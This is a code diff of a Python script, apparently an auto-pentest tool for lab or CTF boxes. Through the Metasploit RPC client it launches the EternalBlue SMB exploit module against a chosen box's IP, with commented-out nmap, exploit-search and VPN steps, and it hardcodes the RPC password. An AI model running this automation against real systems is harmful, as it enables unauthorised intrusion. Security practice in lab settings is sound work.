@@ -9,9 +9,6 @@ import pymetasploit3
 from pymetasploit3 import *
 from pymetasploit3.msfrpc import MsfRpcClient
 
-client = MsfRpcClient('Km9EcHcp', port=55552)
-
-
 parser = argparse.ArgumentParser(description='What box do you want to pwn?')
 parser.add_argument('--box', required=True)
 name = parser.parse_args()
@@ -85,6 +82,7 @@ def controlBox(name: str, action: str):
 
 def workflow():
     CS.update_db()
+    #os.system("xfce4-terminal -e \'bash -c \"sudo openvpn /home/mnm/Documents/AutoPen/DonDada.ovpn; bash\"\'")
     #Open a terminal with tmux
     # os.system("xfce4-terminal -e \'bash -c \"tmux new-session -s sisc; bash\"\'")
     # time.sleep(1)
@@ -128,6 +126,26 @@ def workflow():
     #         for exploit in exploits:
     #             print(exploit)
     #print(client.modules.exploits)
+    #Add a new window to search exploits in metasploit
+    # windowsMSF = session.new_window(attach=True, window_name="msf")
+    # paneMSF = windowsMSF.split_window(attach=True)
+    # paneMSF.send_keys("msfconsole")
+    # time.sleep(5)
+
+    #!!!!!!TODO: use msfrpc library to get a console to search for an exploit
+    # exploitToUse = ""
+    # for cve in cveList:
+    #     print(cve)
+    #     print(CS.edbid_from_cve(cve))
+    #     for i in CS.edbid_from_cve(cve):
+    #         paneMSF.send_keys("search" + str(i))
+    #         #print(pyperclip.paste())
+    #         exploitToUse = pyperclip.paste()
+    #         time.sleep(5)
+    # print(exploitToUse)
+    #paneMSF.send_keys("load msgrpc Pass=Km9EcHcp")
+    client = MsfRpcClient('Km9EcHcp', port=55552)
+
     exploit = client.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
     #print(exploit.description)
     exploit['RHOSTS'] = getBoxIP(name)
@@ -191,7 +209,10 @@ def workflow():
     # windowsNmap = session.new_window(attach=True, window_name="nmap")
     # paneNmap = windowsNmap.split_window(attach=True)
     # paneNmap.send_keys("nmap -sC -sV -oA " + name.box +" " + getBoxIP(name))
-    #Add a new window for searchsploit
+    #Add a new window to search exploits in metasploit
+    # windowsNmap = session.new_window(attach=True, window_name="nmap")
+    # paneNmap = windowsNmap.split_window(attach=True)
+    # paneNmap.send_keys("nmap -sC -sV -oA " + name.box +" " + getBoxIP(name))
 
 
 initBoxes()
